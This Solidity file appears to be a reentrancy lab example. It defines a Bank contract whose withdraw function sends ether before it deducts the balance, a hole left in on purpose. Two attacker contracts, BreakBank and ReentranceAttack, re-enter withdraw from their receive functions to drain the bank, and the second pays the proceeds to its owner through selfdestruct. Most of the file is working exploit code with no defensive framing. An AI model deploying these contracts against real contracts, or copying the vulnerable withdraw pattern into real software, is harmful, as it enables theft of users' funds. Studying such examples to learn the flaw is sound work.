// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";

contract Bank {
    using SafeMath for uint256;
    mapping(address => uint256) public balances;

    function deposit(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result, ) = msg.sender.call{value: _amount}("");
            require(result, "e/transfer_failed");
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}

contract BreakBank {
    Bank bank;
    uint256 amount;
    bool public hit_fall;
    bool public hit_rec;

    constructor(address _bank) public {
        amount = 1000;
        bank = Bank(payable(_bank));
        hit_fall = false;
        hit_rec = false;
    }

    function hack() public {
        bank.withdraw(amount);
    }

    receive() external payable {
        hit_fall = true;
        if (address(bank).balance >= amount) {
            bank.withdraw(amount);
        }
    }

    // receive() external payable {
    // hit_rec = true;
    // }
}

contract ReentranceAttack {
    address payable public owner;
    Bank targetContract;
    uint256 targetValue;

    constructor(address _targetAddr) public {
        targetContract = Bank(payable(_targetAddr));
        owner = msg.sender;
        targetValue = 100000000000000;
    }

    function set_target_value(uint256 _value) public {
        targetValue = _value;
    }

    function balance() public view returns (uint256) {
        return address(this).balance;
    }

    function donateAndWithdraw() public payable {
        require(msg.value >= targetValue);
        targetContract.deposit{value: msg.value}(address(this));
        targetContract.withdraw(msg.value);
    }

    function destr() public {
        selfdestruct(owner);
    }

    receive() external payable {
        uint256 targetBalance = address(targetContract).balance;
        if (targetBalance >= targetValue) {
            targetContract.withdraw(targetValue);
        }
    }
}
